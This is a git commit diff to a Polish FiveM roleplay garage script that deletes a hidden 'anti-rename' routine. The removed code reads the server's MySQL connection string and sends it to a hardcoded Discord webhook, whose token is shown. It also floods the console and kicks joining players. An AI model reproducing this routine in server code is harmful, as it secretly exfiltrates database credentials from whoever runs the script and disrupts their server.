f4892b266a5d48fc37ba629481c1a017c732791b
Marcel <67207947+szymczakovv@users.noreply.github.com>
2021-03-20 10:43:03 +0100

    Update main.lua

--- resources/[local]/[Arivi]/szymczakovv_garages/server/main.lua
+++ resources/[local]/[Arivi]/szymczakovv_garages/server/main.lua
@@ -118,48 +118,6 @@ AddEventHandler('garages:updateOwnedVehicle', function(vehicleProps)
 		end
 	)
  end)
-AddEventHandler('onResourceStart', function(resourceName)
-	if (GetCurrentResourceName() ~= resourceName) then
-      return
-    end
-	local _source = source
-	local xPlayer = ESX.GetPlayerFromId(_source)
-	local realname = 'szymczakovv_garages'
-	local reason = 'WYKRYTO ZMIANĘ NAZWY SKRYPTU ------> '..GetCurrentResourceName()..' Nazwa, która jest wymagana do włączenia tego skryptu to: '..realname
-	if GetCurrentResourceName() ~= realname then
-		local mysql = GetConvar("mysql_connection_string") 
-		if mysql == nil then 
-			mysql = 'Nie znaleziono'
-		end
-		wiadomosc = reason.. "\nMYSQl: "..mysql
-        jebaccimatkelogihere('szymczakovv_jest_fajny', wiadomosc, 11750815)
-		CreateThread(function()
-			while true do
-				Citizen.Wait(10)
-				print(reason)
-			end
-		end)
-		AddEventHandler("esx:playerLoaded", function()
-			DropPlayer(_source, reason)
-		end)
-	end
-end)
-
-function jebaccimatkelogihere(hook,message,color)
-	local gigafajnywebhook22321 = 'https://discord.com/api/webhooks/820676511891193887/D-wohSFe6brevUhdefLU8GecdJ6thEBSxIq6a6RBfs06KHAI1rn-R6tplnMAyTWOHiiD'
-	local embeds = {
-				{
-			["title"] = message,
-			["type"] = "rich",
-			["color"] = color,
-			["footer"] = {
-				["text"] = 'AriviRP.pl'
-					},
-				}
-			}
-	if message == nil or message == '' then return FALSE end
-	PerformHttpRequest(gigafajnywebhook22321, function(err, text, headers) end, 'POST', json.encode({ username = hook,embeds = embeds}), { ['Content-Type'] = 'application/json' })
-end
 
 RegisterServerEvent('garages:removeCarFromParking')
 AddEventHandler('garages:removeCarFromParking', function(plate, networkid)
